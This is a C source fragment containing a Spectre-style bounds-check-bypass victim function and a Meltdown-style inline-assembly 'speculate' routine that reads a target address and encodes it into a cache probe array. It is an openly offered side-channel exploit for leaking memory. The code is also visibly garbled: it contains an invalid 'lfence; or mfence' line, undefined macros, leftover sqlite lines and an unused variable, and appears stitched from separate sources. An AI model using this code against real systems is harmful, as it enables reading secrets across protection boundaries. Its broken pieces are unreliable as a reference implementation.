//Victim code.

unsigned int array1_size = 16;
uint8_t unused1[64];
uint8_t array1[160] = { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16 };
uint8_t unused2[64];
uint8_t array2[256 * 512];
uint8_t timeTT[256];
volatile int flag = 0;
volatile int flag_T = 0;
//sqlite3 *db=NULL;
char *zErrMsg =NULL;
char sql[1000] ;

char *secret = "MELTWEB IS COMMING ";

uint8_t temp = 0; /* Used so compiler wonat optimize out victim_function() */

void victim_function(size_t x) {
	if (x < array1_size) {
		__asm__("lfence"); or __asm__("mfence"); 
		 int rv;
		array2[array1[x] * 512] = 1;
		temp &= array2[array1[x] * 512];
	}
}


static char target_array[VARIANTS_READ * TARGET_SIZE];


extern char stopspeculate[];

static void __attribute__((noinline))
speculate(unsigned long addr)
{
#ifdef __x86_64__
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%rax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%rax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%rax, 1), %%rbx\n"

		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#else /* ifdef __x86_64__ */
	asm volatile (
		"1:\n\t"

		".rept 300\n\t"
		"add $0x141, %%eax\n\t"
		".endr\n\t"

		"movzx (%[addr]), %%eax\n\t"
		"shl $12, %%eax\n\t"
		"jz 1b\n\t"
		"movzx (%[target], %%eax, 1), %%ebx\n"


		"stopspeculate: \n\t"
		"nop\n\t"
		:
		: [target] "r" (target_array),
		  [addr] "r" (addr)
		: "rax", "rbx"
	);
#endif
}
